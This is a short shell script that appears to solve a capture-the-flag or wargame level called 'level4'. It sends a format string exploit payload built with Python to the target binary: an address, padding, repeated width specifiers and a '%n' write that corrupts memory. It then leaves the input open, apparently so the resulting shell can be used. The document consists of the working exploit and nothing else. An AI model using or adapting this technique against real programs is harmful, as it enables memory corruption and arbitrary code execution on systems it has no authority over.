#!/bin/sh

(python -c 'print("\x10\x98\x04\x08"+"A"+"%.1539101x"*11+"%n\n")'; cat -) | ./level4

exit 0
